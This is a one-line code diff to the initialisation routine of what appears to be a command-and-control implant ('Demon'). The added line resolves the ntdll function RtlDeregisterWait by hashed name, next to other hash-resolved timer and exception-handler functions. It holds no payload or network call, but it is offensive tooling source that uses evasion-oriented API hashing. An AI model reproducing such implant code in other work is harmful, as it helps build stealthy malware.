@@ -315,6 +315,7 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         Instance->Win32.RtlCreateTimer                    = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLCREATETIMER );
         Instance->Win32.RtlQueueWorkItem                  = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLQUEUEWORKITEM );
         Instance->Win32.RtlRegisterWait                   = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLREGISTERWAIT );
+        Instance->Win32.RtlDeregisterWait                 = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLDEREGISTERWAIT );
         Instance->Win32.RtlDeleteTimerQueue               = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLDELETETIMERQUEUE );
         Instance->Win32.RtlCaptureContext                 = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLCAPTURECONTEXT );
         Instance->Win32.RtlAddVectoredExceptionHandler    = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLADDVECTOREDEXCEPTIONHANDLER );
